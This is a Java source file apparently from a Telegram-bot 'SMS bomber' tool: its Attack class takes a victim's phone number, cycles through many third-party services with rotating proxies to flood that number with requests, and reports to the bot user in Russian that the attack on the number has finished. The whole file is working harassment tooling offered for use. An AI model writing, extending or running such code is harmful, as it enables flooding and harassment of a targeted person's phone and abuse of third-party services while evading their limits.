package bomber.ojiekcahdp.dev.bomber;

import java.net.Proxy;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.logging.Logger;

import bomber.ojiekcahdp.dev.Bomber;
import bomber.ojiekcahdp.dev.services.Service;
import bomber.ojiekcahdp.dev.services.Services;
import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.jetbrains.annotations.NotNull;
import org.telegram.telegrambots.meta.api.objects.Update;

public class Attack extends Thread {

    public static HashMap<Long, List<Attack>> attacks = new HashMap<>();
    private boolean stopped = false;
    private Update update;
    private final Callback callback;
    private final String phoneCode;
    private final String phone;
    private final int numberOfCycles;
    private final List<Proxy> proxies;

    private int progress = 0;

    private CountDownLatch tasks;

    private static final OkHttpClient.Builder clientBuilder = new OkHttpClient.Builder()
            .addInterceptor(chain -> {
                Request request = chain.request();
                Logger.getGlobal().warning((String.format("Sending request %s", request.url())));

                Response response = chain.proceed(request);
                Logger.getGlobal().warning((String.format("Received response for %s with status code %s",
                        response.request().url(), response.code())));

                return response;
            });

    public Attack(Callback callback, String phoneCode, String phone, int cycles, List<Proxy> proxies, long clientId, Update update) {
        super(phone);

        this.callback = callback;
        this.phoneCode = phoneCode;
        this.phone = phone;
        this.proxies = proxies;
        this.update = update;

        numberOfCycles = cycles;
        Attack.attacks.putIfAbsent(clientId, new ArrayList<>());
        Attack.attacks.get(clientId).add(this);
    }

    @Override
    public void run() {
        List<Service> usableServices = Services.getUsableServices(phoneCode.isEmpty() ? 0 : Integer.parseInt(phoneCode));

        callback.onAttackStart(usableServices.size(), numberOfCycles);
        Logger.getGlobal().info(String.format("Starting attack on +%s%s", phoneCode, phone));

        clientBuilder.proxy(null);

        for (int cycle = 0; cycle < numberOfCycles; cycle++) {
            if (stopped) break;
            if (!proxies.isEmpty())
                clientBuilder.proxy(proxies.get(cycle % proxies.size()));

            OkHttpClient client = clientBuilder.build();

            Logger.getGlobal().info(String.format("Started cycle %s", cycle));
            tasks = new CountDownLatch(usableServices.size());

            for (Service service : usableServices) {
                if (stopped) break;
                try {
                    service.prepare(phoneCode, phone);
                    service.run(client, new bomber.ojiekcahdp.dev.services.Callback() {
                        @Override
                        public void onError(Exception e) {
                            Logger.getGlobal().severe(String.format("%s returned error", service.getClass().getName(), e));
                            tasks.countDown();
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull Response response) {
                            if (!response.isSuccessful()) {
                                Logger.getGlobal().info(String.format("%s returned an error HTTP code: %s",
                                        service.getClass().getName(), response.code()));
                            }

                            tasks.countDown();
                            callback.onProgressChange(progress++);
                        }
                    });
                } catch (StringIndexOutOfBoundsException e) {
                    Logger.getGlobal().warning(String.format("%s could not process the number", service.getClass().getName()));
                }
            }

            try {
                tasks.await();
            } catch (InterruptedException e) {
                break;
            }
        }

        callback.onAttackEnd();
        Logger.getGlobal().info(String.format("Attack on +%s%s ended", phoneCode, phone));
        Bomber.bot.sendMessage(this.update, "Атака на номер " + phoneCode + phone + " завершена!");
    }

    public void stopAttack() {
        this.stopped = true;
        this.stop();
    }
}
